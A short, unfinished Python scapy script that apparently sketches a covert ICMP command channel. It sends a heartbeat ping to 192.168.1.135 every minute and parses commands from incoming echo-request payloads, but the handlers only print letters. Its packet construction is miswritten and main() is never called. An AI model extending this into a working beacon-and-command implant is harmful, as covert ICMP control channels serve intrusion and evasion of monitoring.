import time
import threading
from scapy.all import *

cmn_cmds = []


def cmd_mon(pkt):
    if str(pkt.getlayer(ICMP).type) == "8":
        print(pkt.show())
        print(pkt.getlayer(ICMP).type)
        instruct = pkt.getlayer(ICMP).load.decode()
        cmd_proc(instruct)


def cmd_proc(cmd):
    if (cmd[0] == "a"):
        if (cmd[1] == "c"):
            print("A")
        elif (cmd[1] == "p"):
            print("A")
    elif (cmd[0] == "e"):
        if (cmd[1] == "c"):
            print("e")
        elif (cmd[1] == "p"):
            print("e")


def heart():
    print("TheLoaded RICK")
    while True:
        sr1(IP(dst="192.168.1.135" / ICMP() / "test"))
        print("BEAT")
        time.sleep(60)


def sniffer():
    sniff(filter="icmp", prn=cmd_mon)


def main():
    t1 = threading.Thread(target=heart)
    t2 = threading.Thread(target=sniffer)
    t1.start()
    t2.start()
    t1.join()
    t2.join()


sr1(IP(dst="192.168.1.135" / ICMP() / "test"))
print("BEAT")
